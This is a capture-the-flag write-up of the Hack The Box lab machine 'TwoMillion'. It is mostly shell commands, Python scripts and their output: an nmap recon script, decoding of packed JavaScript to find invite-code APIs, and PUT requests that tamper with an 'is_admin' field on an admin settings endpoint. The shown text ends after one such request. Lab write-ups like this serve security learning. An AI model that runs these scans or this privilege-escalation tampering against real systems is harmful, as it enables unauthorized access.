
``` bash

#!/bin/bash

ip=$1
current_dir=$(pwd)

if [ $# -ne 1 ]; then
    echo "Usage: $0 <ip>"
    exit 1
fi

sleep 2

nmap -p- -sS -Pn --min-rate 5000 "$ip" -oN "$current_dir"/all_ports.txt 2>/dev/null

echo -e "\e[32m[*] First script done\e[0m"

sleep 2

ports=$(grep "^[0-9]" "$current_dir"/all_ports.txt | cut -d "/" -f1 | paste -sd "," -)

sleep 1

echo -e "\e[32m[*] Open ports = '$ports'\e[0m"

sleep 1

nmap -p "$ports" -sCV -Pn --min-rate 5000 "$ip" -oN "$current_dir"/version_ports.txt 2>/dev/null

echo -e "\e[32m[*] Done\e[0m"

```

``` bash

❯ recon 10.129.229.66
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 01:08 +0200
Nmap scan report for 10.129.229.66
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
[*] First script done
[*] Open ports = '22,80'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 01:08 +0200
Nmap scan report for 10.129.229.66
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
[*] Done
╭─ ~/hacking/ctf/htb/easy/twomillion/recon                                                                   ✔ │ 28s ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ echo '10.129.229.66 2million.htb' | sudo tee -a /etc/hosts
10.129.229.66 2million.htb
╭─ ~/hacking/ctf/htb/easy/twomillion/recon                                                                         ✔ ─╮
╰─                                                                                                                   ─╯

```

<img width="955" height="592" alt="image" src="https://github.com/user-attachments/assets/1a73ba85-b5a7-4e37-af1d-59fbf6d9fc23" />


<img width="593" height="535" alt="image" src="https://github.com/user-attachments/assets/2b9f3eb8-9939-47d2-981d-aef20f6264b9" />

<img width="581" height="115" alt="image" src="https://github.com/user-attachments/assets/a823e887-8621-43b8-b1da-0aa44770ca04" />

<img width="955" height="216" alt="image" src="https://github.com/user-attachments/assets/9bf01eba-c359-458a-8af2-fb3049a58557" />

``` js

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))

```

<img width="895" height="765" alt="image" src="https://github.com/user-attachments/assets/feadf8ea-ff09-4883-909d-5ec62ebc27d6" />



``` js

function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

```

``` python

import requests


url = "http://2million.htb/api/v1/invite/how/to/generate"

session = requests.Session()
session.cookies.set("session" ,"qjvqi985nqh19n0nm1bkk032dh")

try:
     r = session.post(url)
     print(r.status_code)
     print(r.text)

except Exception as e:
       print(f"Error:{e}")

```

``` bash

❯ python3 generate.py
200
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import codecs

texto = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr"

print(codecs.decode(texto, "rot_13"))

```

``` bash

❯ python3 rot13.py
/home/joel/hacking/ctf/htb/easy/twomillion/scripts/rot13.py:3: SyntaxWarning: invalid escape sequence '\/'
  texto = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr"
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import requests


url = "http://2million.htb/api/v1/invite/generate"

session = requests.Session()
session.cookies.set("session" ,"qjvqi985nqh19n0nm1bkk032dh")

try:
     r = session.post(url)
     print(r.status_code)
     print(r.text)

except Exception as e:
       print(f"Error:{e}")

```
``` bash

❯ python3 create.py
200
{"0":200,"success":1,"data":{"code":"U1dOV1EtWjZJMVotUU01NUctQzgyVTM=","format":"encoded"}}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ echo 'U1dOV1EtWjZJMVotUU01NUctQzgyVTM=' | base64 -d
SWNWQ-Z6I1Z-QM55G-C82U3%                                                                                                ╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

<img width="428" height="565" alt="image" src="https://github.com/user-attachments/assets/b8868dd2-f2bf-4cb3-9de3-b187e8135829" />

<img width="484" height="442" alt="image" src="https://github.com/user-attachments/assets/040991c3-6051-4230-9690-a262f0fb7598" />

<img width="956" height="925" alt="image" src="https://github.com/user-attachments/assets/e003ead3-1af1-4397-8175-ad00a32d1840" />

<img width="552" height="528" alt="image" src="https://github.com/user-attachments/assets/36f9c058-02e0-41de-a503-fe4eb4165a8c" />


``` python

import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url)
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Invalid content type.'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─
                                                                                                                 ─╯
```

``` python
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email": "test@test.com"})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Missing parameter: is_admin'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email":"test@test.com", "is_admin":"true"})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Variable is_admin needs to be either 0 or 1.'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```
``` python3
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email":"test@test.com", "is_admin":0})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```


``` bash

❯ python3 request.py
200
{'id': 13, 'username': 'test', 'is_admin': 0}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```



